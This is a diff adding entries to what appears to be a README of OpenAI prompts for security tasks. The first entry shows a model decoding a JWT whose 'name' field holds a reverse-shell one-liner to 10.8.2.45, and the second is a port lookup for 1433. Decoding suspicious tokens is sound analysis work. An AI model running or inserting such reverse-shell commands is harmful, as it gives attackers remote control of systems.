@@ -381,3 +381,28 @@ detection:
 ```
 Hello World! This is a test of the compression and decompression of a string
 ```
+
+<h4>10. Decode JTW Token</h4>
+
+`OpenAI prompt:` 
+> Please decode JWT token payload ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMC44LjIuNDUiLCJuYW1lIjoic2ggLWkgPiYgL2Rldi91ZHAvMTAuOC4yLjQ1LzQyNDIgMD4mMSIsImlhdCI6MTUxNjIzOTEyMn0.AmnVg7KnvwVxR3SOdR0y6U9mp9F2MwU6U3emOATM8WA```
+
+`OpenAI Response:`
+> The decoded payload will be - 
+```
+
+{
+  "sub": "10.8.2.45",
+  "name": "sh -i >& /dev/udp/10.8.2.45/4242 0>&1",
+  "iat": 1516239122
+}
+```
+
+<h4>11. Info about port</h4>
+
+`OpenAI prompt:` 
+> What program use port ```1433```?
+
+`OpenAI Response:`
+> Microsoft SQL Server is a program that commonly uses port 1433.
+
